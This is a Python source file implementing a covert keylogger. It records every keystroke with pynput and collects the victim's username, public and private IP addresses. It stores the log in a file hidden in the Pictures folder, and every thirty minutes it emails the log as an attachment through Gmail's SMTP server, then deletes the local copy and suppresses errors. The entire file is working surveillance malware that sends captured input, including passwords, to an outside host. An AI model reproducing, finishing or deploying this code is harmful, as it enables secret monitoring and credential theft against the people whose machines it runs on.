import pynput
from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

publicIP =  requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser("~").split('\\')[2]
datetime = time.ctime(time.time())

msg = f'[START OF LOGS]\n *~ Date/Time: {datetime}\n *~ User-Profile: {user}\n *~ Public-IP: {publicIP}\n *~ Private-IP: {privateIP}\n\n'

logged_data = []
logged_data.append(msg)

delete_file = []

def on_press(key):

        substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',

                'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 

                'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 

                '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 

                '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

        key = str(key).strip("\\")

        if key in substitution:
                logged_data.append(substitution[substitution.index(key)+1])
        else:
                logged_data.append(key.replace("'",''))


def write_file(count):

        filepath = os.path.expanduser('~') + '/Pictures/Camera Roll'
        filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
        file = filepath + filename
        delete_file.append(file)

        with open(file, 'w') as fp:
                fp.write(''.join(logged_data))

        
def send_logs():
        count = 0
        fromAddr = ''
        fromPswd = ''
        toAddr = fromAddr
        while True:
                time.sleep(30*60)
                if len(logged_data) > 1:
                        try:
                                write_file(count)
                                
                                subject = f'[{user}] ~ {count}'

                                msg = MIMEMultipart()
                                msg['From'] = fromAddr
                                msg['To'] = toAddr
                                msg['Subject'] = subject
                                body = 'testing'
                                msg.attach(MIMEText(body, 'plain'))

                                attachment = open(delete_file[0],'rb')

                                filename = delete_file[0].split('/')[2]

                                part = MIMEBase('application', 'octet-stream')
                                part.set_payload((attachment).read())
                                encoders.encode_base64(part)
                                part.add_header('content-disposition', 'attachment;filename='+str(filename))
                                msg.attach(part)

                                text = msg.as_string()

                                s = smtplib.SMTP('smtp.gmail.com', 587)
                                s.ehlo()
                                s.starttls()
                                s.ehlo()
                                s.login(fromAddr, fromPswd)
                                s.sendmail(fromAddr, toAddr, text)
                                attachment.close()
                                s.close()

                                os.remove(delete_file[0])
                                del logged_data[1:]
                                del delete_file[0:]

                                count += 1
                        except:
                                pass


if __name__=='__main__':
        t1 = threading.Thread(target=send_logs)
        t1.start()

        with Listener(on_press=on_press) as listener:
                listener.join()

                                        



